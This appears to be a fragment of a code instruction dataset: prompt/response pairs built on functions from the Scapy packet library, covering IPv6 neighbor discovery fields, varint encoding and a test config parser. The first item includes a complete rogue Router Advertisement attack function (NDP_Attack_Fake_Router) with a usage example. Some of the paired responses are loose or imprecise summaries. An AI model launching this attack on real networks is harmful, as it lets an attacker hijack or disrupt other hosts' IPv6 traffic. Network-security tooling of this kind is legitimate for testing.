{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef NDP_Attack_Fake_Router(ra, iface=None, mac_src_filter=None,\n                           ip_src_filter=None):\n    \"\"\"\n    The purpose of this function is to send provided RA message at layer 2\n    (i.e. providing a packet starting with IPv6 will not work) in response\n    to received RS messages. In the end, the function is a simple wrapper\n    around sendp() that monitor the link for RS messages.\n\n    It is probably better explained with an example:\n\n      >>> ra  = Ether()/IPv6()/ICMPv6ND_RA()\n      >>> ra /= ICMPv6NDOptPrefixInfo(prefix=\"2001:db8:1::\", prefixlen=64)\n      >>> ra /= ICMPv6NDOptPrefixInfo(prefix=\"2001:db8:2::\", prefixlen=64)\n      >>> ra /= ICMPv6NDOptSrcLLAddr(lladdr=\"00:11:22:33:44:55\")\n      >>> NDP_Attack_Fake_Router(ra, iface=\"eth0\")\n      Fake RA sent in response to RS from fe80::213:58ff:fe8c:b573\n      Fake RA sent in response to RS from fe80::213:72ff:fe8c:b9ae\n      ...\n\n    Following arguments can be used to change the behavior:\n\n      ra: the RA message to send in response to received RS message.\n\n      iface: a specific interface (e.g. \"eth0\") of the system on which the\n             DoS should be launched. If none is provided, conf.iface is\n             used.\n\n      mac_src_filter: a mac address (e.g \"00:13:72:8c:b5:69\") to filter on.\n         Only RS messages received from this source will trigger a reply.\n         Note that no changes to provided RA is done which imply that if\n         you intend to target only the source of the RS using this option,\n         you will have to set the Ethernet destination address to the same\n         value in your RA.\n         The default value for this parameter is None: no filtering on the\n         source of RS is done.\n\n    ip_src_filter: an IPv6 address (e.g. fe80::21e:bff:fe4e:3b2) to filter\n         on. Only RS messages received from this source address will trigger\n         replies. Same comment as for previous argument apply: if you use\n         the option, you will probably want to set a specific Ethernet\n         destination address in the RA.\n    \"\"\"\n\n    def is_request(req, mac_src_filter, ip_src_filter):\n        \"\"\"\n        Check if packet req is a request\n        \"\"\"\n\n        if not (Ether in req and IPv6 in req and ICMPv6ND_RS in req):\n            return 0\n\n        mac_src = req[Ether].src\n        if mac_src_filter and mac_src != mac_src_filter:\n            return 0\n\n        ip_src = req[IPv6].src\n        if ip_src_filter and ip_src != ip_src_filter:\n            return 0\n\n        return 1\n\n    def ra_reply_callback(req, iface):\n        \"\"\"\n        Callback that sends an RA in reply to an RS\n        \"\"\"\n\n        src = req[IPv6].src\n        sendp(ra, iface=iface, verbose=0)\n        print(\"Fake RA sent in response to RS from %s\" % src)\n\n    if not iface:\n        iface = conf.iface\n    sniff_filter = \"icmp6\"\n\n    sniff(store=0,\n          filter=sniff_filter,\n          lfilter=lambda x: is_request(x, mac_src_filter, ip_src_filter),\n          prn=lambda x: ra_reply_callback(x, iface),\n          iface=iface)", "response": "This function is used to send a fake router to the network."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nuses to select the L2 address", "response": "def route(self):\n        \"\"\"Used to select the L2 address\"\"\"\n        dst = self.dst\n        if isinstance(dst, Gen):\n            dst = next(iter(dst))\n        return conf.route6.route(dst)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef extract_padding(self, data):\n\n        if self.plen == 0 and self.nh == 0 and len(data) >= 8:\n            # Extract Hop-by-Hop extension length\n            hbh_len = orb(data[1])\n            hbh_len = 8 + hbh_len * 8\n\n            # Extract length from the Jumbogram option\n            # Note: the following algorithm take advantage of the Jumbo option\n            #        mandatory alignment (4n + 2, RFC2675 Section 2)\n            jumbo_len = None\n            idx = 0\n            offset = 4 * idx + 2\n            while offset <= len(data):\n                opt_type = orb(data[offset])\n                if opt_type == 0xc2:  # Jumbo option\n                    jumbo_len = struct.unpack(\"I\", data[offset + 2:offset + 2 + 4])[0]  # noqa: E501\n                    break\n                offset = 4 * idx + 2\n                idx += 1\n\n            if jumbo_len is None:\n                warning(\"Scapy did not find a Jumbo option\")\n                jumbo_len = 0\n\n            tmp_len = hbh_len + jumbo_len\n        else:\n            tmp_len = self.plen\n\n        return data[:tmp_len], data[tmp_len:]", "response": "Extract the padding from the IPv6 payload."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ncomputing the sources_number field when needed", "response": "def post_build(self, packet, payload):\n        \"\"\"Compute the 'sources_number' field when needed\"\"\"\n        if self.sources_number is None:\n            srcnum = struct.pack(\"!H\", len(self.sources))\n            packet = packet[:26] + srcnum + packet[28:]\n        return _ICMPv6.post_build(self, packet, payload)"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef post_build(self, packet, payload):\n        if self.records_number is None:\n            recnum = struct.pack(\"!H\", len(self.records))\n            packet = packet[:6] + recnum + packet[8:]\n        return _ICMPv6.post_build(self, packet, payload)", "response": "Compute the records_number field when needed"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nparse a json file to get a configuration", "response": "def parse_config_file(config_path, verb=3):\n    \"\"\"Parse provided json to get configuration\n    Empty default json:\n    {\n      \"testfiles\": [],\n      \"breakfailed\": true,\n      \"onlyfailed\": false,\n      \"verb\": 3,\n      \"dump\": 0,\n      \"crc\": true,\n      \"scapy\": \"scapy\",\n      \"preexec\": {},\n      \"global_preexec\": \"\",\n      \"outputfile\": null,\n      \"local\": true,\n      \"format\": \"ansi\",\n      \"num\": null,\n      \"modules\": [],\n      \"kw_ok\": [],\n      \"kw_ko\": []\n    }\n\n    \"\"\"\n    import json\n    import unicodedata\n    with open(config_path) as config_file:\n        data = json.load(config_file, encoding=\"utf8\")\n        if verb > 2:\n            print(\"### Loaded config file\", config_path, file=sys.stderr)\n\n    def get_if_exist(key, default):\n        return data[key] if key in data else default\n    return Bunch(testfiles=get_if_exist(\"testfiles\", []),\n                 breakfailed=get_if_exist(\"breakfailed\", True),\n                 remove_testfiles=get_if_exist(\"remove_testfiles\", []),\n                 onlyfailed=get_if_exist(\"onlyfailed\", False),\n                 verb=get_if_exist(\"verb\", 3),\n                 dump=get_if_exist(\"dump\", 0), crc=get_if_exist(\"crc\", 1),\n                 scapy=get_if_exist(\"scapy\", \"scapy\"),\n                 preexec=get_if_exist(\"preexec\", {}),\n                 global_preexec=get_if_exist(\"global_preexec\", \"\"),\n                 outfile=get_if_exist(\"outputfile\", sys.stdout),\n                 local=get_if_exist(\"local\", False),\n                 num=get_if_exist(\"num\", None),\n                 modules=get_if_exist(\"modules\", []),\n                 kw_ok=get_if_exist(\"kw_ok\", []),\n                 kw_ko=get_if_exist(\"kw_ko\", []),\n                 format=get_if_exist(\"format\", \"ansi\"))"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nadding the endianness to the format", "response": "def set_endianess(self, pkt):\n        \"\"\"Add the endianness to the format\"\"\"\n        end = self.endianess_from(pkt)\n        if isinstance(end, str) and end:\n            if isinstance(self.fld, UUIDField):\n                self.fld.uuid_fmt = (UUIDField.FORMAT_LE if end == '<'\n                                     else UUIDField.FORMAT_BE)\n            else:\n                # fld.fmt should always start with a order specifier, cf field\n                # init\n                self.fld.fmt = end[0] + self.fld.fmt[1:]"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nretrieves the field with endianness", "response": "def getfield(self, pkt, buf):\n        \"\"\"retrieve the field with endianness\"\"\"\n        self.set_endianess(pkt)\n        return self.fld.getfield(pkt, buf)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nadding the field with endianness to the buffer", "response": "def addfield(self, pkt, buf, val):\n        \"\"\"add the field with endianness to the buffer\"\"\"\n        self.set_endianess(pkt)\n        return self.fld.addfield(pkt, buf, val)"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nreturns whether the AbstractUVarIntField is represented on multiple bytes or not.", "response": "def _detect_multi_byte(self, fb):\n        # type: (str) -> bool\n        \"\"\" _detect_multi_byte returns whether the AbstractUVarIntField is represented on  # noqa: E501\n          multiple bytes or not.\n\n          A multibyte representation is indicated by all of the first size bits being set  # noqa: E501\n\n        @param str fb: first byte, as a character.\n        @return bool: True if multibyte repr detected, else False.\n        @raise AssertionError\n        \"\"\"\n        assert(isinstance(fb, int) or len(fb) == 1)\n        return (orb(fb) & self._max_value) == self._max_value"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef m2i(self, pkt, x):\n        # type: (Optional[packet.Packet], Union[str, Tuple[str, int]]) -> int\n        \"\"\"\n          A tuple is expected for the \"x\" param only if \"size\" is different than 8. If a tuple is received, some bits  # noqa: E501\n          were consumed by another field. This field consumes the remaining bits, therefore the int of the tuple must  # noqa: E501\n          equal \"size\".\n\n        @param packet.Packet|None pkt: unused.\n        @param str|(str, int) x: the string to convert. If bits were consumed by a previous bitfield-compatible field.  # noqa: E501\n        @raise AssertionError\n        \"\"\"\n        assert(isinstance(x, bytes) or (isinstance(x, tuple) and x[1] >= 0))\n\n        if isinstance(x, tuple):\n            assert (8 - x[1]) == self.size, 'EINVAL: x: not enough bits remaining in current byte to read the prefix'  # noqa: E501\n            val = x[0]\n        else:\n            assert isinstance(x, bytes) and self.size == 8, 'EINVAL: x: tuple expected when prefix_len is not a full byte'  # noqa: E501\n            val = x\n\n        if self._detect_multi_byte(val[0]):\n            ret = self._parse_multi_byte(val)\n        else:\n            ret = orb(val[0]) & self._max_value\n\n        assert(ret >= 0)\n        return ret", "response": "Convert a string to an integer."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nconverts an any value to an internal value.", "response": "def any2i(self, pkt, x):\n        # type: (Optional[packet.Packet], Union[None, str, int]) -> Optional[int]  # noqa: E501\n        \"\"\"\n          A \"x\" value as a string is parsed as a binary encoding of a UVarInt. An int is considered an internal value.  # noqa: E501\n          None is returned as is.\n\n        @param packet.Packet|None pkt: the packet containing this field; probably unused.  # noqa: E501\n        @param str|int|None x: the value to convert.\n        @return int|None: the converted value.\n        @raise AssertionError\n        \"\"\"\n        if isinstance(x, type(None)):\n            return x\n        if isinstance(x, six.integer_types):\n            assert(x >= 0)\n            ret = self.h2i(pkt, x)\n            assert(isinstance(ret, six.integer_types) and ret >= 0)\n            return ret\n        elif isinstance(x, bytes):\n            ret = self.m2i(pkt, x)\n            assert (isinstance(ret, six.integer_types) and ret >= 0)\n            return ret\n        assert False, 'EINVAL: x: No idea what the parameter format is'"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef addfield(self, pkt, s, val):\n        # type: (Optional[packet.Packet], Union[str, Tuple[str, int, int]], int) -> str  # noqa: E501\n        \"\"\" An AbstractUVarIntField prefix always consumes the remaining bits\n          of a BitField;if no current BitField is in use (no tuple in\n          entry) then the prefix length is 8 bits and the whole byte is to\n          be consumed\n        @param packet.Packet|None pkt: the packet containing this field. Probably unused.  # noqa: E501\n        @param str|(str, int, long) s: the string to append this field to. A tuple indicates that some bits were already  # noqa: E501\n          generated by another bitfield-compatible field. This MUST be the case if \"size\" is not 8. The int is the  # noqa: E501\n          number of bits already generated in the first byte of the str. The long is the value that was generated by the  # noqa: E501\n          previous bitfield-compatible fields.\n        @param int val: the positive or null value to be added.\n        @return str: s concatenated with the machine representation of this field.  # noqa: E501\n        @raise AssertionError\n        \"\"\"\n        assert(val >= 0)\n        if isinstance(s, bytes):\n            assert self.size == 8, 'EINVAL: s: tuple expected when prefix_len is not a full byte'  # noqa: E501\n            return s + self.i2m(pkt, val)\n\n        # s is a tuple\n        # assert(s[1] >= 0)\n        # assert(s[2] >= 0)\n        # assert (8 - s[1]) == self.size, 'EINVAL: s: not enough bits remaining in current byte to read the prefix'  # noqa: E501\n\n        if val >= self._max_value:\n            return s[0] + chb((s[2] << self.size) + self._max_value) + self.i2m(pkt, val)[1:]  # noqa: E501\n        # This AbstractUVarIntField is only one byte long; setting the prefix value  # noqa: E501\n        # and appending the resulting byte to the string\n        return s[0] + chb((s[2] << self.size) + orb(self.i2m(pkt, val)))", "response": "Add a field to the current bitfield."}
